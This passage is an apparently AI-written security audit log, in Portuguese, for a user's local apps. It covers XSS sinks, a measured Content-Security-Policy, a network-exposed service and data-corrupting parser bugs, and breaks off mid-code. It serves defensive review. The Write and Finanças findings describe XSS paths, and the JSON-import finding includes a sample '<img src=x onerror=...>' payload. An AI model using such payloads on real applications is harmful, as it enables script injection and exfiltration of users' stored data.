# Pendências de segurança — 19/10/2026 (papel DAVID)

Status: **aguardando decisão do Yuri.** Nada aqui foi aplicado, exceto o que já está
registrado como corrigido mais abaixo.

Método: workflow de auditoria com 6 agentes (um por app) + 3 verificadores adversários
por achado (caminho real / reprodução / severidade). Só o que **sobreviveu** a 2 dos 3
verificadores entrou aqui. Quando os verificadores refutaram um achado, isso está
escrito na seção. Rodada de 20/10/2026. Último veredito: **21/10/2026** (P33, medido
em teste empírico com Chromium).

**Rodada 2 (20/10):** os agentes de DA, Write e TriboDEM não devolveram resultado na
primeira rodada; foram relançados.
- **Flow Calculation**: auditoria re-disparada → **5 achados novos confirmados** (PRIORIDADES
  15, 16, 17, 22, 23) + confirmação dos 3 bugs de `server.py` da PRIORIDADE 2.
- **DA**: voltou com **4 achados** (PRIORIDADES 18, 19, 20, 21).
- **Write** e **TriboDEM**: auditoria re-disparada em 20/10 (o workflow anterior morreu com o
  reinício da sessão).

**Rodada 3 (20/10, verificação adversarial do DA):** os 4 achados do DA passaram pelos
3 verificadores (3 lentes × 2 achados por rodada de 2 achados). Resultado: **os 4
sobreviveram, mas todos com severidade corrigida para BAIXO** — 3 deles porque as
premissas do achado original estavam erradas (OneDrive, nomes de arquivo, "sem aviso").
O que sobrou de real foi registrado em "Achados REFUTADOS" e virou **1 achado novo
(PRIORIDADE 24)**, que é o pior problema do DA: nome de arquivo só com dígitos vira
pressão/temperatura **inventada**, sem aviso. Write e TriboDEM: re-auditoria ainda em voo
quando este documento foi fechado.

**Rodada 4 (20/10, TriboDEM):** o agente de auditoria do TriboDEM devolveu **6 achados
novos** (PRIORIDADES 25-30) — **1 crítico** (o sweep de convergência é inócuo no motor
GPU: os três casos "convergentes" são a mesma simulação), 2 altos (tipo "montagem" fora
da validação → CFD-DEM com alimentação contínua; STL sem validação → peça entra com
malha vazia), 2 médios (mistura de lotes na janela de Resultados; ffmpeg da vida útil
engolido) e 1 baixo (variável de ambiente que desliga a exclusão mútua CPU/GPU).
**Nenhum verificado adversarialmente ainda** — entram como "achado do agente", com a
ressalva de que `dem_gpu.py` (PRIORIDADE 25) não foi lido pelo agente (só grep) e está
na lista de arquivos protegidos.

**Rodada 4 (20/10, Flow Calculation — correção externa):** reli o `server.py` inteiro e
**os 3 bugs da PRIORIDADE 2 já foram corrigidos** por outra sessão (`import tempfile` em
`:12`, `_raiz_permitida` em `:52` e `:214`, `_dentro_do_projeto` eliminada). A
PRIORIDADE 2 sai da lista de patches.

**Rodada 4 (20/10, Write):** o agente de auditoria do Write devolveu **6 achados novos**
(PRIORIDADES 31-36) — **2 críticos** (XSS: HTML importado via `outerHTML` cru em
`docio.js:742`/`:706`; XSS: LaTeX importado com o grupo cru em `docio.js:973`), 2 altos
(nenhuma `Content-Security-Policy` no app; fechar aba apaga o rascunho sem confirmação),
2 médios (cache de CDN gravado em disco sem hash; nenhum teste de sanitização/CSP/IPC).
**Em verificação adversarial** — 2 verificadores (caminho real / reprodução) rodando
quando este documento foi fechado. O que **confirmei por leitura própria**: a
ausência de CSP (grep em todo o projeto: só achados em `testes/node_modules`), o
`IDB.del` sem confirmação (`app.js:84`), o `protocol.handle("https")` sem verificação
de hash (`Write.js:45-62`) e o `outerHTML` cru (`docio.js:742`, `:706`).

**Rodada 5 (20/10, verificação adversarial):** rodaram 3 lentes × achado. Resultado:
- **P32 (XSS via LaTeX) — sobreviveu, severidade corrigida CRÍTICO → ALTO.** O caminho
  inteiro foi rastreado sem nenhum escaping; mas `contextIsolation: true` + `sandbox:
  true` (sem `nodeIntegration`) limitam o dano a XSS de renderer com exfiltração.
- **P34 (fechar aba) — sobreviveu, ALTO, com agravantes novos:** no build desktop o
  backup na nuvem **nunca** roda (`preload.js` só expõe `writeDesktop`), logo **todo**
  fechamento de aba apaga o rascunho de forma definitiva e **sem vestígio** na tela.
  Contraste que prova que não era a intenção: fechar a **janela** preserva tudo.
- **P35 (cache de CDN sem hash) — sobreviveu, MÉDIO:** sem verificação em lugar algum;
  agravante é a persistência (sem TTL, sem revalidação) — envenenamento único sobrevive
  para sempre, inclusive offline. Não é ALTO porque exige CDN comprometido ou MITM.
- **P25 (fator_dt GPU) — o mecanismo alegado foi REFUTADO** por 2 de 3 lentes: o sweep
  de convergência **não** é inócuo, o `fator_dt` chega ao motor GPU dentro de
  `info["dt"]`. A severidade caiu **CRÍTICO → ALTO** e o achado foi reescrito com os 3
  defeitos reais (passo dobrado na GPU, limite validado violado em silêncio, chave
  `fator_dt_gpu` morta e não documentada).
- **P27 (STL sem validação) — sobreviveu, severidade corrigida ALTO → MÉDIO:** o caminho
  existe; o modo mais perigoso (STL vazio/truncado) é **100% silencioso**; o barulhento
  já avisa.
- **P24 (nome de arquivo vira grandeza inventada) — sobreviveu, MÉDIO, 3 de 3 lentes.**
  Detalhe corrigido: o arquivo **sem** dígito não é "ignorado" — a `ValueError` faz o
  **lote inteiro** cair para `indice_espectro` (rotulado, com aviso). O problema real é
  o **oposto**: nome **com** dígito e **sem** unidade é aceito em silêncio.
- **P31 (XSS via HTML importado) — sobreviveu, severidade ALTO confirmada.** O `onerror`
  executa de verdade: `cleanInline` (`docio.js:700`) escapa texto e descarta `<img>`
  solto, mas **dois** caminhos entregam `outerHTML` cru com todos os atributos —
  `docio.js:706` (class `cite`/`xref`/`m`/`fn`/`cmt`) e `docio.js:742`
  (class `fig`/`tab`/`toc`/`pgbrk`) — e o sink é `ed.innerHTML = s.html`
  (`doc.js:513`/`:526`), **sem `esc()`**. O mesmo furo vale para arrastar-e-soltar
  (`app.js:276`) e colar (`doc.js:568`). **Não é RCE**: sem `nodeIntegration` +
  `contextIsolation` + `sandbox`, o dano é **exfiltração** (IndexedDB, `localStorage`,
  rede) e **integridade do documento** — o arquivo adulterado é salvo e exportado como
  se fosse o original. O gatilho é **local** (abrir/arrastar/colar HTML de terceiros);
  não há vetor remoto automático.
- **P30 (fila CPU/GPU desligada) — sobreviveu, severidade corrigida BAIXO → MÉDIO.**
  `FILA_CALCULOS_DESLIGADA` é lida como booleano de verdade (`fila_calculos.py:199-200`):
  **qualquer valor não-vazio** desliga a fila, inclusive `"0"` ou `"false"`, sem log nem
  aviso. O `flock` de `~/.fila_calculos/trava_gpu` é a **única** exclusão mútua entre
  processos DEM-Engine; o `LimitadorGPU` (`dem_gpu.py:62-72`) é teto de uso, não
  exclusão, e está desligado por padrão. Entre **dois** runners a exclusão some: dois
  DEM-Engine na mesma GPU travam em futex (`dem_gpu.py:643-644`), o watchdog mata o caso
  e ele vira ERRO — **horas de cálculo perdidas**.
- **P29 (ffmpeg da vida útil engolido) — sobreviveu, severidade corrigida MÉDIO → BAIXO.**
  O que se perde é o **artefato de vídeo** e a mensagem de erro; vida, desgaste e
  `vida_estimada_revestimento_h` são calculados antes e **não mudam**. Nenhum número da
  tese é afetado.
- **P28 (mistura de lotes nos Resultados) — sobreviveu, MÉDIO confirmada.** A pasta do
  lote é reutilizada e não é limpa; `runner.copiar` faz `rmtree`+`copytree` por `id`
  (`runner.py:354-357`), então os casos fora do lote novo ficam. A tabela não tem coluna
  de lote nem de data — o Yuri lê vida/desgaste antigos como atuais. `lote_resumo.csv`/
  `json` são reescritos só com o lote atual (`runner.py:431-435`): nenhum número
  corrompido, o ETA não é afetado.
- **P12 (pickle do checkpoint) — sobreviveu, severidade corrigida MÉDIO → BAIXO.** O
  fato técnico confere (`pickle.load` antes de qualquer conferência; o `sha1` cobre o
  print do CASO, não o arquivo; não há sha256/checksum/assinatura no projeto), mas o
  caminho real não sustenta exploração por terceiros: o arquivo é **gerado localmente
  pelo mesmo motor**, não há `wget`/`curl`/`rsync`/`scp` dele, o `id` é validado contra
  travessia (`runner.py:154-160`) e a pasta do caso é **apagada no fim**
  (`yade_worker.py:2113`, `dem_gpu.py:859`). **Correção ao que eu escrevi antes:** a
  frase "a nuvem é o vetor de substituição mais provável" **não se sustenta** — não
  existe caminho de sincronização do checkpoint.
- **P33 (ausência de CSP):** lente de caminho real rodando; resultado ao final.

**Rodada 7 (21/10, veredito do P33 por teste empírico):**
- **P33 (ausência de CSP) — o FATO se confirma, mas a CORREÇÃO que eu propus estava
  ERRADA, e a severidade cai de ALTO para MÉDIO.** Rodei teste empírico (Playwright +
  Chromium, fora da pasta Write) porque a premissa do achado — *"'unsafe-inline' não
  bloqueia handler inline"* — é justamente o que a MDN deixa ambíguo, e o achado
  inteiro depende dela. **Medido: com `'unsafe-inline'` em `script-src`, o `onerror`
  EXECUTA** (o XSS das P31/P32 **não** é neutralizado pela CSP como eu havia escrito);
  **sem** `'unsafe-inline'` (nonce ou hash) o handler é barrado **e** o bundle continua
  rodando. Pior: a `<meta>` do `build.py` cairia **fora do `<head>`** (o `build.py:6-21`
  gera um fragmento e quem embrulha é o `montar.py:7-9`, dentro do `<body>`) e o
  navegador **ignora** meta CSP fora do `<head>` — a linha proposta **não faria nada**.
  E a política proposta quebraria vídeo (`media-src`) e fonte embutida de PDF
  (`font-src blob:`). **Correção real:** header CSP na `Response` do `Write.js:38-40`
  (vale para o Electron e para o `navegador/Write.html`) + `nonce` nos dois `<script>`
  inline do `build.py:15-20`, **sem** `'unsafe-inline'`. Severidade **MÉDIO** porque
  a CSP é defesa em profundidade que **contém** o dano, não um privilégio novo — o
  Electron já tem `contextIsolation` + `sandbox` e o `preload` mínimo.

**Rodada 8 (21/10, continuação da rodada 7 — o que a medição do round 7 deixou aberto):**
- **Lacuna (b) FECHADA por medição: `'unsafe-eval'` é DISPENSÁVEL.** Rodei o **MathJax
  3.2.2 real** (o `tex-svg.min.js` de 2 065 978 bytes do cache do app) sob CSP **por
  header**, com `script-src` **sem** `'unsafe-inline'` **e sem** `'unsafe-eval'`, o
  MathJax vindo do `cdnjs` como no app: `MathJax.tex2svg` devolveu SVG e houve
  **zero** violação de `unsafe-eval`. O motivo está no código: o bundle tem só 2 usos
  de execução dinâmica, ambos **inalcançáveis** no renderer (`eval("require")` só se
  `process` existir; `new Function("return this")` só se `globalThis` for `undefined`).
- **Escopo mínimo confirmado por leitura:** **zero** handlers inline (`onerror=`,
  `onclick=`, …) nos 13 módulos e no `body.html`; **zero** `eval(`/`new Function(`
  nos 13 módulos. Ou seja, **uma CSP sem `'unsafe-inline'` não quebra o app** — não há
  handler legítimo para barrar.
- **`'unsafe-eval'` fora, `blob:` é precaução:** o único `URL.createObjectURL` é o
  download (`core.js:63`) e as mídias do documento são `data:` base64 (`cloud.js:53`).
- **Correção ao que eu escrevi antes:** o `cite.js` **ESTÁ** no build (`build.py:5`
  lista 13 módulos) e faz `fetch` cross-origin para `api.crossref.org`/`api.openalex.org`
  (`cite.js:115`, `:121`, `:128`, `:135`) ⇒ `connect-src` **precisa** dessas origens.
- **A CSP por `sha256` do bundle é FAIL SILENCIOSO:** os 4 `index.html` do projeto têm
  **4 hashes diferentes** do bundle (só o do `window.MathJax`, 112 bytes, é estável).
  Rebuild → hash muda → o `<script>` é barrado → **app abre em branco**. **Por isso a
  correção é por NONCE gerado no `Write.js` por carga**, com substituição de string
  no HTML servido (verificado: há exatamente 2 `<script>` exatos no arquivo e **zero**
  `<script>` literal dentro do bundle ⇒ substituição sem falso positivo). Isso também
  **elimina a necessidade de mexer no `build.py`** (e a colisão com a vlrm no `core.js`).
- **P31/P32/P33 valem para o binário que o Yuri usa:** `Write.js` e `preload.js`
  instalados em `%LOCALAPPDATA%\Programs\Write\resources\app/` são **byte a byte
  idênticos** ao repo; o `index.html` instalado tem os mesmos **5 sinks de
  `outerHTML`** e **zero** CSP.
- **Desalinhamento de build (achado novo, operacional):** `computador/app/index.html`
  (19/10 23:10, 731 194 B) está **desatualizado** vs `codigo-fonte/dist/index.html`
  (21/10 08:21, 758 570 B) — o `montar.py` não foi rodado depois do último `build.py`.
  E `navegador/Write.html` (684 423 B) tem um bundle de versão **anterior** (prefixo
  comum de 44 783 B de 688 208), **sem script de build nenhum** — é copiado à mão.

**Rodada 9 (21/10 — a suíte de `testes/` com a CSP ativa, rodada de verdade):**
- **Lacuna (c) FECHADA: a suíte do Write passa com a CSP ativa.** Copiei
  `codigo-fonte/`, `navegador/` e `testes/` para `%TEMP%\p33_csp3` (o projeto **não**
  foi tocado), injetei a CSP por **header** no `harness.js` (que é onde o
  `route.fulfill` monta o `index.html`, `harness.js:34`) e rodei os **30** testes
  `t_*.js` de funcional (deixei de fora os `t_wcag_*.js`, que são de outro escopo).
  **Resultado: 29/30 com `rc=0` nos dois cenários** (sem CSP e com CSP), com
  **exatamente uma** diferença: `t_tese_shot` falha (`rc=1`) **sem** CSP e passa
  **com** CSP — ou seja, é **flakiness de teste**, não efeito da CSP. Nenhum teste
  regrediu por causa da política.
- **As 6 falhas que pareciam do app eram do PRÓPRIO TESTE** (e foramInvestigadas uma a
  uma): `t_pedit`, `t_pptnat`, `t_rt`, `t_rt_abnt`, `t_rtsl`, `t_tese` e
  `t_wordnat` quebravam com
  `page.addScriptTag: Executing inline script violates the following Content
  Security Policy directive 'script-src ...'` — o `addScriptTag({content: ...})`
  injeta a biblioteca de teste `rtlib.js` (7 251 B) **inline**, e a CSP (por
  desenho, sem `'unsafe-inline'`) barra isso. **Não é o app**: é o harness
  injetando código de teste por uma porta que a CSP fecha. Convertendo o
  `addScriptTag` inline em `<script src="http://app.local/rtlib.js">` (servido
  pelo próprio harness), os **8/8** voltaram a passar (`rc=0`) **com** a CSP ativa.
  **Consequência prática: quando a CSP for aplicada, esses 7 testes precisam da
  mesma troca de 1 linha** — caso contrário a suíte vai acusar breakage que não
  existe. (Mudança de 1 linha por teste, em `testes/` — **fora** do escopo desta
  auditoria, que é read-only.)
- **Lacuna (e) FECHADA: `worker-src` NÃO é preciso.** O pdf.js 3.11.174 é usado com
  `isEvalSupported: false` (`pdfedit.js:13`, `docio.js:807`, `docio.js:1034`) e o
  bundle do pdf.js 3.x usa **`pdfjsWorker.WorkerMessageHandler`** (fake worker, na
  main thread) — nunca `new Worker`. Medido: rodando o app real (o `dist` de hoje,
  bundle `sha256-qvGC9nj…`) com `page.on('worker')` ligado, o app cria **0 workers**,
  e o `pdfjs` carrega **igual** com `worker-src 'none'`, `worker-src 'self' blob:`
  ou sem `worker-src`. ⇒ **`worker-src blob:` sai da política** (era precaução).
- **`connect-src` NÃO precisa de `https://fonts.googleapis.com`** — **alerta**: um
  agente mediu isso e eu quase escrevi no documento. **Refutei por medição própria.**
  O `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?…">` é
  governado por **`style-src`**, não por `connect-src` (CSP: `style-src-elem` para
  folha de estilo, `connect-src` para `fetch`/XHR). Medido com 4 políticas: com
  `style-src` contendo `https://fonts.googleapis.com` e `connect-src 'self'` →
  **zero** violação e o CSS **é** requisitado; com `style-src` **sem** a origem e
  `connect-src` **com** a origem → **violação** `Loading the stylesheet
  'https://fonts.googleapis.com/css2?family=Tinos&display=swap' violates the
  following Content Security Policy directive: "style-src 'self'"`. A violação que o
  agente viu era do **`fetch` que o próprio teste dele fazia** para o CSS, não do app.
  ⇒ `connect-src` fica só com `'self'`, `api.crossref.org` e `api.openalex.org`.
- **`style-src` PRECISA de `'unsafe-inline'`** (contra a minha expectativa inicial):
  o atributo `style="…"` **do HTML** é bloqueado sem `'unsafe-inline'` (medido:
  `style-src 'self'` → o `style=` do HTML **não** é aplicado e o Chromium avisa
  *"Applying inline style violates the following Content Security Policy directive
  'style-src 'self'"*; com `'unsafe-inline'` → aplicado, **zero** violação). O
  **CSSOM** (`el.style.color = …`) passa em ambos os casos. O app usa atributo
  `style=` inline em **111 lugares** (5 em `body.html` + 106 nos 13 módulos) ⇒ sem
  `'unsafe-inline'` em `style-src` o documento **aparece sem formatação**.
  ⇒ **`'unsafe-inline'` em `style-src` é obrigatório**; a proteção real vem de
  `script-src` (que é onde está o XSS).

**Política mínima final, medida (substitui a da rodada 7):**

```
default-src 'self';
script-src 'self' 'nonce-<valor>' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
img-src 'self' data: blob:;
font-src 'self' data: blob: https://fonts.gstatic.com;
media-src 'self' data: blob:;
connect-src 'self' https://api.crossref.org https://api.openalex.org;
object-src 'none';
base-uri 'self'
```

Sem `'unsafe-inline'` em `script-src` (fecha o XSS), sem `'unsafe-eval'`
(medido: dispensável), sem `worker-src` (medido: desnecessário), `style-src` com
`'unsafe-inline'` (medido: obrigatório), `connect-src` com as 2 APIs de citação
(medido: `cite.js`), `media-src`/`font-src`/`img-src` com `data:` e `blob:`
(medido: vídeo `data:video/mp4;base64` é bloqueado por `media-src 'none'`).

---

## PRIORIDADE 1 — OmniRoute exposto na rede (ALTO)

**Estado atual, verificado agora:**
- `netstat`: `TCP 0.0.0.0:20128 LISTENING` — ou seja, escuta em **todas** as interfaces
  de rede, não só no loopback.
- `C:\Users\yuri\.omniroute\.env` tem **1 linha**, só `STORAGE_ENCRYPTION_KEY=...`.
  Não tem `OMNIROUTE_SERVER_HOST` nem `REQUIRE_API_KEY`.
- Sem `OMNIROUTE_SERVER_HOST`, o runtime cai no default do pacote
  (`dist/.env.example:355` → `OMNIROUTE_SERVER_HOST=0.0.0.0`).
- Sem `REQUIRE_API_KEY`, o runtime cai em `defaultValue: "false"`
  (`dist/open-sse/mcp-server/server.js:12443-12451`).

**Correção (2 linhas no `.env` + reiniciar o serviço):**
```
OMNIROUTE_SERVER_HOST=127.0.0.1
REQUIRE_API_KEY=true
```

**Por que importa:** qualquer pessoa na mesma rede (Wi-Fi da casa, da faculdade, do
laboratório) consegue abrir o painel do OmniRoute. As rotas que exigem login
continuam protegidas, mas a superfície exposta e o consumo da sua cota de modelos
ficam acessíveis de fora.

**Toca o fluxo do Yuri:** sim — se ele usa o OmniRoute de outro aparelho na mesma rede,
o bind em 127.0.0.1 quebra esse acesso até ele reativar com senha. Por isso a decisão
é dele, não minha.

**Status:** **congelado** por decisão do qe-flow-12 ("Não tocar no OmniRoute — aguardando
decisão do Yuri") e do GN ("NADA no OmniRoute [...] será alterado sem o Yuri").

---

## PRIORIDADE 2 — Flow Calculation: `POST /api/run` devolve 500 — **JÁ CORRIGIDO** (verificado em 20/10)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\QE\qe-flow\flowcalc\web\server.py`
(alterado em **19/10 às 21:39** por outra sessão — não fui eu)

> **ATUALIZADO EM 20/10:** reli o arquivo inteiro. **Os três erros já foram corrigidos**
> por outra sessão. O bug **não existe mais** — sai da lista de patches. Detalhe do
> antes/depois abaixo.

O arquivo ganhou hoje um conjunto novo de proteções (`_dentro_de`, `_raiz_permitida`,
`_host_permitido`, `_mpi_seguro`, `_qe_bin_seguro`, `_checar_host`). Três erros nessa
mesma edição:

**a) Linha 184 — função que não existe:**
```python
elif request.structure_path:
    structure = _dentro_do_projeto(request.structure_path, "structure_path")
```
O arquivo define `_dentro_de` (linha 41) e `_raiz_permitida` (linha 49). **`_dentro_do_projeto`
não existe em lugar nenhum.** Resultado: `NameError` → **HTTP 500** em todo
`POST /api/run` que venha com `structure_path`.

**b) Linha 54 — `tempfile` não importado:**
```python
raizes = [ROOT, Path.home().resolve(), Path(tempfile.gettempdir()).resolve()]
```
Os imports (linhas 3-15) são `base64, ipaddress, json, os, re, shlex, socket, subprocess,
sys, time, uuid` + `pathlib`/`typing`. **`tempfile` não está na lista** → `NameError`
assim que `_raiz_permitida` for chamada.

**c) A proteção de caminho é código morto:** `_raiz_permitida` (o guarda que barra
`..` para fora do projeto, da pasta do usuário ou da temporária) é definida e **nunca
chamada**. Trocar o nome na linha 184 por `_raiz_permitida` é o que resolve (a) e (b)
**e** reativa (c) de uma vez.

**Como o Yuri aciona isso (não é teoria):**
- `flowcalc/web/static/index.html:19` tem o campo `id="structure-path"`.
- `flowcalc/web/static/assets/app.js:9` manda sempre `structure_path: $('#structure-path').value||null`
  no corpo do `POST /api/run`.
- Ou seja: **digitar um caminho de estrutura local na tela web e clicar em rodar →
  500.** O caminho por upload de arquivo (`structure_base64`) não é afetado.

**Prova (análise do AST, sem rodar o servidor):**
```
tempfile importado?              False
_dentro_do_projeto DEFINIDA?     False
_raiz_permitida DEFINIDA?        True
_dentro_do_projeto CHAMADA?      True
_raiz_permitida CHAMADA?         False
```
Confirmação cruzada pelo bytecode: `__pycache__/server.cpython-312.pyc` (19:40, antes da
edição) **não contém** nenhuma dessas três casas; `server.cpython-314.pyc` (22:45, depois)
tem os nomes como string, mas `tempfile` **não** está em `co_names` do módulo (logo não foi
importado) e `_dentro_do_projeto` **não** está em `co_names` do módulo, só em
`co_names` de `start_run` (chamada, não definição).

**Correção mínima (2 linhas):**
```python
# 1) junto aos imports da linha 3-15
import tempfile

# 2) linha 184
    structure = _raiz_permitida(request.structure_path, "structure_path")
```

**Toca o fluxo do Yuri:** sim — é o botão de rodar cálculo com caminho de estrutura
local na interface web. Não toca CASTEP, não toca a fila, não mexe em cálculo rodando.
**Cuidado:** a linha 184 está dentro de `start_run`, que é o endpoint que **lança o
processo**. Um 500 aqui é antes de qualquer execução, então o conserto é seguro.

**Cobertura de teste:** `tests/test_workflow.py:103-112` só exercita `/api/results`.
**Nada** no repositório cobre `POST /api/run` com `structure_path` — por isso o bug
sobreviveu à edição das 21:39.

**Por que não corrigi:** o GN congelou o qe-flow ("NADA no OmniRoute, TriboDEM ou qe-flow
será alterado sem o Yuri") e o arquivo foi mexido por outra sessão, que é quem tem o
contexto dela. Precisa ser repassado para quem editou.

### Estado real em 20/10 (releitura do arquivo inteiro): JÁ CORRIGIDO

O texto acima é o **diagnóstico de 19/10 às 21:45**, shortly depois da edição. Reli o
`server.py` inteiro em 20/10 e os três problemas **não existem mais**:

| Item | Onde está hoje | Estado |
|---|---|---|
| `import tempfile` | `server.py:12` | **presente** (era ausência → `NameError`) |
| `_raiz_permitida(valor, nome)` | `server.py:52-62` | **presente**, com `ROOT`, `Path.home()` e `tempfile.gettempdir()` como raízes |
| `structure = _raiz_permitida(request.structure_path, "structure_path")` | `server.py:214` | **presente** (era `_dentro_do_projeto`, que não existia) |
| `_dentro_do_projeto` | — | **não existe mais** em lugar nenhum do arquivo |

A proteção de caminho deixou de ser código morto: `_raiz_permitida` é chamada em
`server.py:214` (o `structure_path` que quebrava) **e** em `server.py:170`
(`pseudo_dir`). O `workdir` continua com a checagem própria em `server.py:202`
(`_dentro_de(ROOT, workdir)`), e o `/api/results` tem a sua em `server.py:264`.

**Conclusão:** o `POST /api/run` com `structure_path` local **não devolve mais 500**.
Nada a fazer, nada a aprovar. A linha 3 da tabela de recomendações sai.

**O que continua valendo do achado:** a **lacuna de teste**. `tests/test_workflow.py:103-112`
só exercita `/api/results` — **nada no repositório cobre `POST /api/run` com
`structure_path`**, que é o caminho que o front usa por padrão
(`web/static/index.html:19` + `web/static/assets/app.js:9`). É por isso que três
erros de nome de função passaram e a correção passou. Recomendo **um teste** que
poste `/api/run` com `structure_path` e espere 200 (ou 400 de caminho, nunca 500).

---

## PRIORIDADE 3 — Finanças: o parser de número corrompe valores em pt-BR (ALTO)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\Financas\Financas.html:196`

```js
const num = v => { if (v === "" || v == null) return null; const n = parseFloat(String(v).replace(",", ".")); return isFinite(n) ? n : null; };
```

Dois defeitos no mesmo `replace`:
1. **sem a flag `g`** → só troca a **primeira** vírgula;
2. **nunca remove o ponto de milhar** pt-BR.

**Prova (node, mesmo código):**
```
num('1.500')     = 1.5      <-- devia ser 1500
num('7.000')     = 7        <-- devia ser 7000
num('1.500,50')  = 1.5      <-- devia ser 1500.50
num('1500,50')   = 1500.5   (ok, este funciona)
num('300')       = 300      (ok)
```
O resultado é `finite`, então **passa** na validação. Não há como o chamador distinguir
"1,5 real" de "1500 digitado com separador".

**Por que o Yuri cai nisso sozinho:** o app mostra os valores com
`Intl.NumberFormat("pt-BR")` (`money()`, linha 188-190). A tela escreve "R$ 1.500".
Copiar da tela e colar no campo de renda reproduz o bug. Os campos são `<input
inputmode="decimal">` de **texto** (linhas 608, 610, 613, 614, 620, 627, 656, 667-669,
711, 713) — não existe `type="number"`, nem máscara, nem `onblur` normalizador.

**Gravação silenciosa (sem aviso, sem toast):** linha 815
`const v = isText ? e.value : (num(e.value) || 0);` → `commit()` → `Store.save()`
(localStorage + nuvem). No formulário de conta, linha 696 `valor: num(g("e-valor"))`
passa pela validação da linha 770 (`o.valor > 0`), porque 1.5 > 0 — a dívida de
R$ 1.500,00 é salva como R$ 1,50.

**Consequência real:** `simulate()` (221+) passa a calcular reserva, metas e parcelas
com renda 1.5; `fecharMes()` (822) abate a dívida de R$ 1.500 com R$ 1,50 e marca
como **quitada**. O histórico (`S.historico`, linha 832) grava errado.

**Correção mínima (1 linha):**
```js
const num = v => { if (v === "" || v == null) return null; const n = parseFloat(String(v).replace(/\./g, "").replace(",", ".")); return isFinite(n) ? n : null; };
```
(tirar o ponto de milhar primeiro, depois trocar a vírgula decimal por ponto).

**Toca o fluxo do Yuri:** sim — é o valor gravado no plano. Recuperável editando o
campo, mas o histórico já gravado fica errado.

**Verificadores:** os 3 lentes não refutaram. Severidade corrigida de "critical" para
**high** (o valor corrompido reaparece visível no campo depois do re-render, então
não é invisível).

---

## PRIORIDADE 4 — Finanças: juros de atraso cobrados ANTES do vencimento (ALTO)

**Arquivo:** `Financas.html:262` (simulação) e `:829` (fechamento de mês)

```js
// linha 262
for (const it of itens) if (AVULSAS.includes(it.cat) && it.rest > 0.005 && (+it.juros || 0) > 0) it.rest *= 1 + it.juros / 100;

// linha 829
for (const it of S.itens) if (!it.concluida && it.ativo !== false && AVULSAS.includes(it.cat) && (+it.juros || 0) > 0 && (!it.desde || it.desde <= x.m)) it.valor = Math.round(it.valor * (1 + it.juros / 100) * 100) / 100;
```

**Nenhuma das duas confere `prazo`.** O campo se chama *"Juros se atrasar (% ao mês)"*
(linha 662) e o app em si separa vencida de futura (linhas 246-247):
```js
const vencidas = pend.filter(i => i.cat === "obrigatoria" && (!i.prazo || i.prazo <= m));
const futuras  = pend.filter(i => i.cat === "obrigatoria" && i.prazo && i.prazo > m);
```
Uma dívida que ainda não venceu entra em `futuras`, é paga só parcialmente (ou nada) —
e **mesmo assim** leva 14% ao mês, por 2 meses, antes do vencimento.

**Prova numérica (node, com o `QUITA_SEED` real, Nubank com prazo empurrado para 2027-01):**
```
mes      aberto(COM juros)  aberto(SEM juros)  Nubank(COM)  Nubank(SEM)  Nubank vence
2026-11       5078.12          4958.00          978.12        858.00    2027-01
2026-12       3496.18          3266.00          896.18        666.00    2027-01
2027-01       1426.18          1196.00                0           0.00    2027-01
```
A dívida infla 14% ao mês **sem nunca ter vencido**. O valor gravado vai para
localStorage e para a nuvem (`commit()` → `Store.save()`).

**Agravante:** as duas regras discordam entre si. A linha 262 também não confere
`desde`, então dívida com `desde` futuro já acumula juros desde o primeiro mês do plano.
O KPI "Quitação" (linha 386, derivado do `simulate`) sai errado e contradiz o valor
guardado.

**Correção mínima (2 linhas):**
```js
// linha 262 — precisa dos dois guardas (desde E prazo)
for (const it of itens) if (AVULSAS.includes(it.cat) && it.rest > 0.005 && (+it.juros || 0) > 0 && (!it.desde || it.desde <= m) && (!it.prazo || it.prazo <= m)) it.rest *= 1 + it.juros / 100;

// linha 829 — acrescentar o prazo
... && (!it.desde || it.desde <= x.m) && (!it.prazo || it.prazo <= x.m)) ...
```
O `!it.prazo` é obrigatório: conta sem prazo (`o.prazo = g("e-prazo") || ""`, linha 698)
tem que continuar acumulando juros, senão a dívida sem vencimento zera o juros.

**Toca o fluxo do Yuri:** sim — é o valor da dívida e o KPI de quitação. Recuperável
editando a conta, mas o histórico já gravado fica com o valor inflado.

**Verificadores:** os 3 lentes não refutaram. Severidade corrigida de "critical" para
**high** (o número errado aparece na tela, na linha 598).

---

## PRIORIDADE 5 — Finanças: importação de JSON sem validação (MÉDIO)

**Arquivo:** `Financas.html:862` (validação), `:346` (normalize), `:589` (render)

**a) Crash na aba "Contas".** `importar()` (858-866) só checa
`if (!o || !Array.isArray(o.itens)) throw new Error("formato")` (862). `normalize()`
(334-350) faz `s.itens.map(i => Object.assign({id:uid(), ativo:true}, i))` (346) — **sem
validar `cat`**. Depois, na aba Contas, a linha 589:
```js
const meta = [`<span class="chip ${i.cat}">${CATS[i.cat].rotulo}</span>`];
```
`CATS["xxx"]` é `undefined` → `TypeError: Cannot read properties of undefined (reading 'rotulo')`.
Não há try/catch no `render()` nem no handler de aba, então a exceção sobe: a aba
Contas fica quebrada, **a cada abertura**, em todos os aparelhos (o estado já foi
salvo no `commit()` da linha 864, antes do crash, e sincronizado).

**b) A dívida importada some do cálculo, em silêncio.** `simulate()` (235-260) só trata
`"mensal"`, `"parcelada"` e as três `AVULSAS`. Item com `cat` inválido **não entra em
nenhum cálculo** — não conta em fixos, nem em dívidas, nem em "Quitação". E a única
aba que permitiria ver o item (Contas) está quebrada. Resultado financeiro errado,
sem aviso.

**c) Injeção de HTML nos campos crus do JSON.** `esc()` existe (linha 186) e é usado em
`i.nome`/`i.nota`, mas **não** em:
- linha 591: `${i.parcelas}`
- linha 594: `String(i.juros).replace(".", ",")`
- linha 595: `dia ${i.dia}`
- linha 598: `data-id="${i.id}"`

Com `cat` válido (ex.: `"parcelada"`) e `parcelas` = `"<img src=x onerror=...>"`, o
`<img onerror>` entra no `app.innerHTML` e executa na origem do app. Não há CSP em
nenhum lugar.

**Correção mínima (bloco pequeno, 4 pontos):**
```js
// 1) normalize(), linha 346 — valida e normaliza o item importado
s.itens = (Array.isArray(s.itens) ? s.itens : []).map(i => Object.assign({id:uid(), ativo:true}, i))
  .filter(i => CATS[i.cat])                       // descarta categoria inválida
  .map(i => Object.assign({}, i, {
